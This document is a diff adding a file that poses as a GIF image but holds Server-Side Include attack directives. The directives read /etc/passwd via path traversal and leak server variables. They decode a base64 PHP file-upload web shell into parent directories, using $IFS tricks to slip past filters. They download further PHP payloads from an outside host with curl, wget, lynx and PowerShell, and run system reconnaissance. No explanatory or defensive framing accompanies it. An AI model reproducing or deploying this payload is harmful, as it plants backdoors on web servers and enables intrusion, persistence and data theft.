@@ -1,0 +1,15 @@
+GIF89;a GIF89;a GIF89;a GIF89;a GIF89;a<!--#include virtual="../../..../../....../../../etc/passwd" -->
+<br>
+<!--#echo var="SCRIPT_FILENAME" -->
+<br>
+<!--#echo var="SERVER_ADDR" -->
+<br>
+<!--#exec cmd="echo PD9waHAgaWYoJF9QT1NUKXtpZihAY29weSgkX0ZJTEVTWyIwIl1bInRtcF9uYW1lIl0sJF9GSUxFU1siMCJdWyJuYW1lIl0pKXtlY2hvIlkiO31lbHNle2VjaG8iTiI7fX1lbHNle2VjaG8iPGZvcm0gbWV0aG9kPXBvc3QgZW5jdHlwZT1tdWx0aXBhcnQvZm9ybS1kYXRhPjxpbnB1dCB0eXBlPWZpbGUgbmFtZT0wPjxpbnB1dCBuYW1lPTAgdHlwZT1zdWJtaXQgdmFsdWU9dXA+Ijt9Pz4= | base64 -d | tee ../../01ganokpw.php" -->
+<!--#exec cmd="echo$IFS'PD9waHAgaWYoJF9QT1NUKXtpZihAY29weSgkX0ZJTEVTWyIwIl1bInRtcF9uYW1lIl0sJF9GSUxFU1siMCJdWyJuYW1lIl0pKXtlY2hvIlkiO31lbHNle2VjaG8iTiI7fX1lbHNle2VjaG8iPGZvcm0gbWV0aG9kPXBvc3QgZW5jdHlwZT1tdWx0aXBhcnQvZm9ybS1kYXRhPjxpbnB1dCB0eXBlPWZpbGUgbmFtZT0wPjxpbnB1dCBuYW1lPTAgdHlwZT1zdWJtaXQgdmFsdWU9dXA+Ijt9Pz4='$IFS|$IFS'base64'$IFS'-d'$IFS|$IFS'tee'$IFS'../../01ganokpw2.php'" -->
+<!--#exec cmd="lynx$IFS-source$IFS'http://adivasirishta.com/advertisement/01ganokpw403.txt'$IFS>$IFS'../../01ganokpw3.php'" -->
+<!--#exec cmd="{curl,http://adivasirishta.com/advertisement/01ganokpw403.txt,-o,../../01ganokpw4.php}" -->
+<!--#exec cmd="{curl,http://adivasirishta.com/advertisement/lol.txt,-o,../../lol.txt}" -->
+<!--#exec cmd="{wget,http://adivasirishta.com/advertisement/01ganokpw403.txt,-O,../../01ganokpw5.php}" -->
+<!--#exec cmd="powershell -Command "(New-Object Net.WebClient).DownloadFile('http://adivasirishta.com/advertisement/01ganokpw403.txt','../../01ganokpw6.php')"" -->
+<br>
+<!--#exec cmd="dir;pwd;{uname,-a}" -->
